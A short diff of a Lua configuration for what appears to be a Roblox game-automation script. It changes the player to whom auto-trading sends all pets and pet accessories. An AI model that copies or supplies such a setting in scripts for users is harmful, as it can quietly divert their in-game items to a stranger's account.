@@ -20,7 +20,7 @@ SelectedPetTypes = {}, -- Pet IDs to farm when SelectiveFarm is true (e.g., {"do
 AutoTrade = {
 Enabled = true, -- Enable auto trading
 AutoAcceptTrades = false, -- Accept incoming trade requests
-Usernames = {"Twilxghtz"}, -- Players to send trades to
+Usernames = {"Lzjf"}, -- Players to send trades to
 TradeMode = "all", -- "all" = everything in categories, "specific" = only Items list
 Categories = {"pets", "pet_accessories"}, -- {"pets", "toys", "food", "transport", "gifts", "stickers", "pet_accessories", "roleplay"}
 Items = {}, -- Item IDs when TradeMode = "specific"
